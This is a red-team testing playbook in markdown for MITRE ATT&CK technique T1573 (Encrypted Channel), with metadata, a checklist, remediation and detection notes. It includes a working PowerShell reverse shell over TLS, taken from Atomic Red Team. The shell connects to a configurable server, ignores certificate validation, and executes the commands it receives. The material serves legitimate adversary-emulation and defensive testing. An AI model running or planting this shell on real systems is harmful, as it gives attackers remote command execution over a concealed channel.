---
name: "T1573_encrypted-channel"
description: "Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1573
  - command-and-control
  - esxi
  - linux
  - macos
  - network-devices
  - windows
technique_id: "T1573"
tactic: "command-and-control"
all_tactics:
  - command-and-control
platforms:
  - ESXi
  - Linux
  - macOS
  - Network Devices
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1573"
tech_stack:
  - esxi
  - linux
  - macos
  - network devices
  - windows
cwe_ids:
  - CWE-300
chains_with:
  - T1573.001
  - T1573.002
prerequisites:
  []
severity_boost:
  T1573.001: "Chain with T1573.001 for deeper attack path"
  T1573.002: "Chain with T1573.002 for deeper attack path"
---

# T1573 Encrypted Channel

## High-Level Description

Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.

## Kill Chain Phase

- Command and Control (TA0011)

**Platforms:** ESXi, Linux, macOS, Network Devices, Windows

## What to Check

- [ ] Identify if Encrypted Channel technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Encrypted Channel
- [ ] Check Linux systems for indicators of Encrypted Channel
- [ ] Check macOS systems for indicators of Encrypted Channel
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: OpenSSL C2

Thanks to @OrOneEqualsOne for this quick C2 method.
This is to test to see if a C2 session can be established using an SSL socket.
More information about this technique, including how to set up the listener, can be found here:
https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926

Upon successful execution, powershell will make a network connection to 127.0.0.1 over 443.

**Supported Platforms:** windows

```powershell
$server_ip = #{server_ip}
$server_port = #{server_port}
$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Encrypted Channel by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1573 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1031 Network Intrusion Prevention
Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.

### M1020 SSL/TLS Inspection
SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols.


## Detection

### Detection Strategy for Encrypted Channel across OS Platforms


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Encrypted Channel technique applicable | Low | Command And Control |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-300 | Channel Accessible by Non-Endpoint |


## References

- [SANS Decrypting SSL](http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840)
- [SEI SSL Inspection Risks](https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html)
- [University of Birmingham C2](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
- [Atomic Red Team - T1573](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1573)
- [MITRE ATT&CK - T1573](https://attack.mitre.org/techniques/T1573)
